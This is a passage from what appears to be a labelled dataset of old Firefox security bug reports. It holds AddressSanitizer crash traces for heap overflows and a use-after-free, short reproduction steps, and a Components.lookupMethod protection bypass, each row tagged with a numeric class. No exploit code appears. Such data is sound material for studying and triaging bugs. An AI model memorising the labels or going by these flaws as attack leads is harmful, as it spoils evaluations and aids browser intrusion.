readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:942 19 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:589 20 in mozilla layers basiclayermanager endtransaction void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:508 21 in mozilla layers basicshadowlayermanager endtransaction void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:1142 22 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const src/layout/base/nsdisplaylist.cpp:1141 23 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const src/layout/base/nsdisplaylist.cpp:1003 24 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int src/layout/base/nslayoututils.cpp:1872 25 in presshell paint nsiview nsregion const unsigned int src/layout/base/nspresshell.cpp:5329 26 in nsviewmanager processpendingupdatesforview nsview bool src/view/src/nsviewmanager.cpp:433 27 in nsviewmanager processpendingupdates src/view/src/nsviewmanager.cpp:1208 28 in nsrefreshdriver notify nsitimer src/layout/base/nsrefreshdriver.cpp:432 29 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:485 30 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:565 31 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 32 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:221 33 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 34 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 35 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 36 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 37 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 38 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 39 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 40 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 41 in xre_main src/toolkit/xre/nsapprunner.cpp:4084 42 in do_main int char src/browser/app/nsbrowserapp.cpp:174 43 in main src/browser/app/nsbrowserapp.cpp:279 44 in is located 8 bytes to the right of 184-byte region allocated by thread t0 here 0 in malloc 1 in moz_malloc src/memory/mozalloc/mozalloc.cpp:64 2 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int src/gfx/thebes/gfxfont.cpp:4491 3 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int src/gfx/thebes/gfxfont.cpp:4508 4 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int src/gfx/thebes/gfxfont.cpp:3553 5 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const unsigned int src/layout/generic/nstextframethebes.cpp:553 6 in buildtextrunsscanner buildtextrunforframes void src/layout/generic/nstextframethebes.cpp:2050 7 in buildtextrunsscanner flushframes bool bool src/layout/generic/nstextframethebes.cpp:1409 8 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1601 shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa stats 262m malloced 245m for red zones by 451453 calls stats 47m realloced by 19228 calls stats 228m freed by 226481 calls stats 193m really freed by 173783 calls stats 245m 62800 full pages mmaped in 467 calls mmaps by size class 7:217035 8:47081 9:14322 10:5621 11:7650 12:1280 13:1088 14:512 15:224 16:720 17:464 18:34 19:35 20:21 mallocs by size class 7:304827 8:87290 9:24303 10:8218 11:17377 12:2304 13:2068 14:1626 15:415 16:1440 17:1449 18:73 19:41 20:22 frees by size class 7:125017 8:55922 9:17553 10:4893 11:15407 12:1512 13:1639 14:1437 15:293 16:1261 17:1430 18:60 19:38 20:19 rfrees by size class 7:95680 8:43221 9:14163 10:3105 11:11615 12:1100 13:1032 14:1283 15:230 16:933 17:1315 18:50 19:37 20:19 stats malloc large 3440 small slow 5269 31621 aborting	11
fix heap-use-after-free in nsprintengine commonprint install fuzzpriv extension to help in invoking print load testcase wait like 10 sec and then press escape once or twice domfuzzhelper created domfuzzhelper created domfuzzhelper created domfuzzhelper created printing to tmp/j1/fuzzout.pdf domfuzzhelper created printing to tmp/j1/fuzzout.pdf domfuzzhelper created printing to tmp/j1/fuzzout.pdf domfuzzhelper created printing to tmp/j1/fuzzout.pdf domfuzzhelper created printing to tmp/j1/fuzzout.pdf 12857 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsprintengine commonprint bool nsiprintsettings nsiwebprogresslistener nsidomdocument src/layout/printing/nsprintengine.cpp:427 1 in nsdocumentviewer print nsiprintsettings nsiwebprogresslistener src/layout/base/nsdocumentviewer.cpp:3666 2 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 3 in invoke src/js/xpconnect/src/xpcwrappednative.cpp:3081 4 in callmethodhelper src/js/xpconnect/src/xpcwrappednative.cpp:2415 5 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode src/js/xpconnect/src/xpcwrappednative.cpp:2381 6 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1488 7 in native src/js/src/jscntxtinlines.h:372 8 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:389 9 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2348 10 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:346 11 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:404 12 in invoke src/js/src/jsinterp.h:112 13 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:437 14 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value src/js/src/jsapi.cpp:5791 15 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjsclass.cpp:1432 16 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjs.cpp:581 17 in prepareanddispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 18 in sharedstub 19 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 20 in ns_processnextevent_p nsithread bool src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:237 21 in nsxulwindow showmodal src/xpfe/appshell/src/nsxulwindow.cpp:366 22 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:1072 23 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:404 24 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 25 in invoke src/js/xpconnect/src/xpcwrappednative.cpp:3081 26 in callmethodhelper src/js/xpconnect/src/xpcwrappednative.cpp:2415 27 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode src/js/xpconnect/src/xpcwrappednative.cpp:2381 28 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1488 29 in native src/js/src/jscntxtinlines.h:372 30 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:389 31 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2348 32 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:346 33 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:404 34 in invoke src/js/src/jsinterp.h:112 35 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:437 36 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value src/js/src/jsapi.cpp:5791 37 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjsclass.cpp:1432 38 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjs.cpp:581 39 in prepareanddispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 40 in sharedstub 41 in nsprintengine showprinterrordialog tag_nsresult bool src/layout/printing/nsprintengine.cpp:1632 42 in nsprintengine commonprint bool nsiprintsettings nsiwebprogresslistener nsidomdocument src/layout/printing/nsprintengine.cpp:426 43 in nsdocumentviewer print nsiprintsettings nsiwebprogresslistener src/layout/base/nsdocumentviewer.cpp:3666 44 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 45 in invoke src/js/xpconnect/src/xpcwrappednative.cpp:3081 46 in callmethodhelper src/js/xpconnect/src/xpcwrappednative.cpp:2415 47 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode src/js/xpconnect/src/xpcwrappednative.cpp:2381 48 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1488 49 in native src/js/src/jscntxtinlines.h:372 50 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:389 51 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2348 52 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:346 53 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:404 54 in invoke src/js/src/jsinterp.h:112 55 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:437 56 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value src/js/src/jsapi.cpp:5791 57 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjsclass.cpp:1432 58 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant src/js/xpconnect/src/xpcwrappedjs.cpp:581 59 in prepareanddispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 60 in sharedstub 61 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 62 in ns_processnextevent_p nsithread bool src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:237 63 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 64 in runinternal src/ipc/chromium/src/base/message_loop.cc:215 65 in runhandler src/ipc/chromium/src/base/message_loop.cc:208 66 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 67 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 68 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3891 69 in xre_main src/toolkit/xre/nsapprunner.cpp:4089 70 in do_main src/browser/app/nsbrowserapp.cpp:174 71 in main src/browser/app/nsbrowserapp.cpp:279 72 in is located 64 bytes inside of 128-byte region freed by thread t0 here 0 in interceptor_free 1 in operator src dist/include/mozilla/mozalloc.h:224 2 in nsprintengine release src/layout/printing/nsprintengine.cpp:222 3 in nsdocumentviewer show src/layout/base/nsdocumentviewer.cpp:1938 4 in nsprescontext ensurevisible src/layout/base/nsprescontext.cpp:1829 5 in presshell unsuppressandinvalidate src/layout/base/nspresshell.cpp:3579 6 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult src/docshell/base/nsdocshell.cpp:6514 7 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6342 8 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6349 9 in nsdocloader dostopdocumentload nsirequest tag_nsresult src/uriloader/base/nsdocloader.cpp:885 10 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:775 11 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:659 12 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:663 13 in nsdocument dounblockonload src/content/base/src/nsdocument.cpp:6972 14 in nsdocument dispatchcontentloadedevents src/content/base/src/nsdocument.cpp:4220 15 in nsrunnablemethodimpl void nsdocument true run src dist/include/nsthreadutils.h:367 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 3 in invoke src/js/xpconnect/src/xpcwrappednative.cpp:3081 4 in callmethodhelper src/js/xpconnect/src/xpcwrappednative.cpp:2415 5 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode src/js/xpconnect/src/xpcwrappednative.cpp:2381 6 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1488 7 in native src/js/src/jscntxtinlines.h:372 8 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:389 9 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2348 10 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:346 11 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:404 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 144m malloced 143m for red zones by 461053 calls stats 11m realloced by 45165 calls stats 117m freed by 318690 calls stats 82m really freed by 244573 calls stats 175m 44883 full pages mmaped in 332 calls mmaps by size class 7:180180 8:55269 9:16368 10:7665 11:4845 12:2560 13:832 14:416 15:208 16:728 17:148 18:14 19:6 20:8 21:3 mallocs by size class 7:316387 8:89162 9:27422 10:11100 11:8505 12:4084 13:1726 14:801 15:301 16:1316 17:202 18:24 19:8 20:12 21:3 frees by size class 7:221395 8:57159 9:19982 10:7245 11:6176 12:2957 13:1511 14:656 15:190 16:1190 17:194 18:18 19:6 20:8 21:3 rfrees by size class 7:174666 8:43529 9:11861 10:5716 11:4350 12:1749 13:1116 14:492 15:152 16:753 17:169 18:10 19:2 20:5 21:3 stats malloc large 1866 small slow 4648 12857 aborting	11
components.lookupmethod allows calling of sow functions user agent mozilla/5.0 windows nt 6.1 wow64 rv:20.0 gecko/20121231 firefox/20.0 build id 20121231030859 steps to reproduce called components.lookupmethod to obtain the clonenode method of a sow protected node actual results i obtained a clone of the node specified in components.lookupmethod expected results components.lookupmethod should throw an exception as it did in ff 17	2
oob write in pixman_fill_sse2 10500 error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 16 at thread t0 0 in pixman_fill_sse2 src/gfx/cairo/libpixman/src/pixman-sse2.c:362 1 in sse2_fill src/gfx/cairo/libpixman/src/pixman-sse2.c:5904 2 in pixman_implementation_fill src/gfx/cairo/libpixman/src/pixman-implementation.c:182 3 in delegate_fill src/gfx/cairo/libpixman/src/pixman-implementation.c:62 4 in pixman_implementation_fill src/gfx/cairo/libpixman/src/pixman-implementation.c:182 5 in moz_pixman_fill src/gfx/cairo/libpixman/src/pixman.c:773 6 in composite_boxes src/gfx/cairo/cairo/src/cairo-image-surface.c:2940 7 in clip_and_composite_boxes src/gfx/cairo/cairo/src/cairo-image-surface.c:3034 8 in clip_and_composite_trapezoids src/gfx/cairo/cairo/src/cairo-image-surface.c:3190 9 in clip_and_composite_polygon src/gfx/cairo/cairo/src/cairo-image-surface.c:3567 10 in cairo_image_surface_fill src/gfx/cairo/cairo/src/cairo-image-surface.c:3758 11 in cairo_surface_fill src/gfx/cairo/cairo/src/cairo-surface.c:2348 12 in cairo_gstate_fill src/gfx/cairo/cairo/src/cairo-gstate.c:1295 13 in moz_cairo_fill_preserve src/gfx/cairo/cairo/src/cairo.c:2459 14 in gfxcontext fill src/gfx/thebes/gfxcontext.cpp:303 15 in nssvgpathgeometryframe render nsrenderingcontext src/layout/svg/nssvgpathgeometryframe.cpp:594 16 in nssvgpathgeometryframe paintsvg nsrenderingcontext nsintrect const src/layout/svg/nssvgpathgeometryframe.cpp:188 17 in non-virtual thunk to nssvgpathgeometryframe paintsvg nsrenderingcontext nsintrect const src/layout/svg/nssvgpathgeometryframe.cpp:224 18 in nssvgutils paintframewitheffects nsrenderingcontext nsintrect const nsiframe src/layout/svg/nssvgutils.cpp:922 19 in nssvgmaskframe computemaskalpha nsrenderingcontext nsiframe gfxmatrix const float src/layout/svg/nssvgmaskframe.cpp:109 20 in nssvgintegrationutils paintframeswitheffects nsrenderingcontext nsiframe nsrect const nsdisplaylistbuilder mozilla layers layermanager src/layout/svg/nssvgintegrationutils.cpp:517 21 in nsdisplaysvgeffects paintaslayer nsdisplaylistbuilder nsrenderingcontext mozilla layers layermanager src/layout/base/nsdisplaylist.cpp:4364 22 in mozilla paintinactivelayer nsdisplaylistbuilder mozilla layers layermanager nsdisplayitem gfxcontext nsrenderingcontext src/layout/base/framelayerbuilder.cpp:1977 23 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void src/layout/base/framelayerbuilder.cpp:3320 24 in mozilla layers basicthebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void src/gfx/layers/basic/basicthebeslayer.h:94 25 in mozilla layers basicshadowablethebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void src/gfx/layers/basic/basicthebeslayer.cpp:400 26 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:187 27 in mozilla layers basicshadowablethebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:301 28 in non-virtual thunk to mozilla layers basicshadowablethebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:312 29 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:819 30 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 31 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:835 32 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 33 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:835 34 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 35 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:590 36 in mozilla layers basiclayermanager endtransaction void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:509 37 in mozilla layers basicshadowlayermanager endtransaction void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:1144 38 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const src/layout/base/nsdisplaylist.cpp:1164 39 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const src/layout/base/nsdisplaylist.cpp:1026 40 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int src/layout/base/nslayoututils.cpp:1976 41 in presshell paint nsiview nsregion const unsigned int src/layout/base/nspresshell.cpp:5358 42 in nsviewmanager processpendingupdatesforview nsview bool src/view/src/nsviewmanager.cpp:428 43 in nsviewmanager processpendingupdates src/view/src/nsviewmanager.cpp:1216 44 in nsrefreshdriver tick long mozilla timestamp src/layout/base/nsrefreshdriver.cpp:947 45 in mozilla refreshdrivertimer tickdriver nsrefreshdriver long mozilla timestamp src/layout/base/nsrefreshdriver.cpp:164 46 in mozilla refreshdrivertimer tick src/layout/base/nsrefreshdriver.cpp:156 47 in mozilla refreshdrivertimer timertick nsitimer void src/layout/base/nsrefreshdriver.cpp:181 48 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:482 49 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:565 50 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 51 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:237 52 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 53 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 54 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 55 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 56 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 57 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 58 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 59 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 60 in xre_main src/toolkit/xre/nsapprunner.cpp:4088 61 in do_main int char src/browser/app/nsbrowserapp.cpp:174 62 in main src/browser/app/nsbrowserapp.cpp:279 63 in is located 10384 bytes to the left of 65536-byte region freed by thread t8 js sour thread here 0 in interceptor_free 1 in js_free void src dist/include/js/utility.h:165 2 in zlib_free void void src/js/src/jsutil.cpp:42 3 in moz_z_deflateend src/modules/zlib/src/deflate.c:996 4 in js compressor compressor src/js/src/jsutil.cpp:63 5 in js sourcecompressorthread internalcompress src/js/src/jsscript.cpp:1003 6 in js sourcecompressorthread threadloop src/js/src/jsscript.cpp:1030 7 in js sourcecompressorthread compressorthread void src/js/src/jsscript.cpp:905 8 in pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 9 in asan asanthread threadstart previously allocated by thread t8 js sour thread here 0 in malloc 1 in js_malloc unsigned long src dist/include/js/utility.h:148 2 in zlib_alloc void unsigned int unsigned int src/js/src/jsutil.cpp:36 3 in moz_z_deflateinit2 src/modules/zlib/src/deflate.c:301 4 in moz_z_deflateinit src/modules/zlib/src/deflate.c:207 5 in js compressor init src/js/src/jsutil.cpp:76 6 in js sourcecompressorthread internalcompress src/js/src/jsscript.cpp:971 7 in js sourcecompressorthread threadloop src/js/src/jsscript.cpp:1030 8 in js sourcecompressorthread compressorthread void src/js/src/jsscript.cpp:905 9 in pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 10 in asan asanthread threadstart thread t8 js sour thread created by t0 here 0 in interceptor_pthread_create 1 in pr_createthread src/nsprpub/pr/src/pthreads/ptthread.c:393 2 in pr_createthread src/nsprpub/pr/src/pthreads/ptthread.c:476 3 in js sourcecompressorthread init src/js/src/jsscript.cpp:921 4 in jsruntime init unsigned int src/js/src/jsapi.cpp:960 5 in js_newruntime unsigned int jsusehelperthreads src/js/src/jsapi.cpp:1131 6 in xpcjsruntime xpcjsruntime nsxpconnect src/js/xpconnect/src/xpcjsruntime.cpp:2451 7 in xpcjsruntime newxpcjsruntime nsxpconnect src/js/xpconnect/src/xpcjsruntime.cpp:2546 8 in nsxpconnect nsxpconnect src/js/xpconnect/src/nsxpconnect.cpp:85 9 in nsxpconnect getxpconnect src/js/xpconnect/src/nsxpconnect.cpp:145 10 in nscontentutils init src/content/base/src/nscontentutils.cpp:340 11 in nslayoutstatics initialize src/layout/build/nslayoutstatics.cpp:152 12 in initialize src/layout/build/nslayoutmodule.cpp:389 13 in nscomponentmanagerimpl knownmodule load src/xpcom/components/nscomponentmanager.cpp:708 14 in nsfactoryentry getfactory src/xpcom/components/nscomponentmanager.cpp:1749 15 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void src/xpcom/components/nscomponentmanager.cpp:1031 16 in nscomponentmanagerimpl getservicebycontractid char const nsid const void src/xpcom/components/nscomponentmanager.cpp:1427 17 in nsgetservicefromcategory operator nsid const void const src/xpcom/components/nscomponentmanager.cpp:166 18 in nscomptr_base assign_from_helper nscomptr_helper const nsid const src/objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:110 19 in nscomptr mozilla moduleloader operator nscomptr_helper const src dist/include/nscomptr.h:691 20 in nscomponentmanagerimpl loaderforextension nsacstring_internal const src/xpcom/components/nscomponentmanager.cpp:1455 21 in nscomponentmanagerimpl knownmodule ensureloader src/xpcom/components/nscomponentmanager.cpp:685 22 in nscomponentmanagerimpl knownmodule load src/xpcom/components/nscomponentmanager.cpp:696 23 in nsfactoryentry getfactory src/xpcom/components/nscomponentmanager.cpp:1749 24 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void src/xpcom/components/nscomponentmanager.cpp:1031 25 in nscomponentmanagerimpl getservicebycontractid char const nsid const void src/xpcom/components/nscomponentmanager.cpp:1427 26 in callgetservice char const nsid const void src/objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:60 27 in nsgetservicebycontractidwitherror operator nsid const void const src/objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:256 28 in nscomptr_base assign_from_gs_contractid_with_error nsgetservicebycontractidwitherror const nsid const src/objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:101 29 in nscomptr nsisupports operator nsgetservicebycontractidwitherror const src dist/include/nscomptr.h:1003 30 in nsappstartupnotifier observe nsisupports char const unsigned short const src/embedding/components/appstartup/src/nsappstartupnotifier.cpp:62 31 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3658 32 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 33 in xre_main src/toolkit/xre/nsapprunner.cpp:4088 34 in do_main int char src/browser/app/nsbrowserapp.cpp:174 35 in main src/browser/app/nsbrowserapp.cpp:279 36 in shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe stats 240m malloced 451m for red zones by 317154 calls stats 46m realloced by 16904 calls stats 216m freed by 213235 calls stats 101m really freed by 144972 calls stats 556m 556m-0m mmaped 139 maps 0 unmaps mmaps by size class 10:208845 11:12282 12:2048 13:1536 14:1280 15:384 16:960 17:1280 18:48 19:40 20:24 mallocs by size class 10:289278 11:19039 12:2422 13:1691 14:1481 15:401 16:1349 17:1358 18:73 19:40 20:22 frees by size class 10:189445 11:16471 12:1491 13:1492 14:1332 15:287 16:1259 17:1342 18:59 19:38 20:19 rfrees by size class 10:131090 11:10181 12:729 13:671 14:710 15:182 16:820 17:558 18:26 19:4 20:1 stats malloc large 1493 small slow 3726 stats stackdepot 0 ids 0m mapped 10500 aborting	11
